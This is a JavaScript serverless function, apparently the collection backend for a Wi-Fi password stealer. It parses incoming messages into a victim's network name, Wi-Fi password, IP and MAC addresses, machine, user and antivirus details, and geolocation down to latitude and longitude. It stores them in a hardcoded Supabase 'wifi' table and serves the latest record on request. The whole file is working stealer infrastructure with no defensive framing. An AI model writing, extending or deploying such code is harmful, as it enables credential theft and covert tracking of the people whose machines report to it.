const { createClient } = require('@supabase/supabase-js');

const supabase = createClient(
    "https://znbejmlgkpwynfirhqvk.supabase.co",
    "sb_publishable_UMEpP7jQskh4KoEMTSe2EA_SpQatu1E"
);

exports.handler = async (event) => {
    if (event.httpMethod === "POST") {
        const params = new URLSearchParams(event.body);
        const message = params.get("message");

        const parts = message.split(" | ");
        const get = (prefix) => {
            const part = parts.find(p => p.startsWith(prefix));
            return part ? part.replace(prefix, "").trim() : "";
        };

        const reseau = get("Réseau: ");
        const brut = parts[1] || "";
        const mot_de_passe = brut.includes(":") ? brut.split(":").slice(1).join(":").trim() : brut.trim();
        const ip = get("IP: ");
        const passerelle = get("Passerelle: ");
        const mac = get("MAC: ");
        const signal = get("Signal: ");
        const pc = get("PC: ");
        const user_pc = get("User: ");
        const os = get("OS: ");
        const cpu = get("CPU: ");
        const gpu = get("GPU: ");
        const ram = get("RAM: ");
        const disque = get("Disque: ");
        const modele = get("Modele: ");
        const fabricant = get("Fabricant: ");
        const serial = get("Serial: ");
        const av = get("AV: ");
        const ip_public = get("IP_PUBLIC: ");
        const ville = get("Ville: ");
        const pays = get("Pays: ");
        const region = get("Region: ");
        const cp = get("CP: ");
        const fai = get("FAI: ");
        const lat = get("Lat: ");
        const lon = get("Lon: ");

        await supabase.from("wifi").insert([{
            reseau, mot_de_passe, ip, passerelle, mac, signal, pc, user_pc, os, cpu, gpu, ram, disque, modele, fabricant, serial, av, ip_public, ville, pays, region, cp, fai, lat, lon
        }]);

        return { statusCode: 200, body: JSON.stringify({ success: true }) };
    }

    if (event.httpMethod === "GET") {
        const { data } = await supabase.from("wifi").select("*").order("created_at", { ascending: false }).limit(1);
        return { statusCode: 200, body: JSON.stringify(data[0]) };
    }

    return { statusCode: 405, body: "Method Not Allowed" };
};
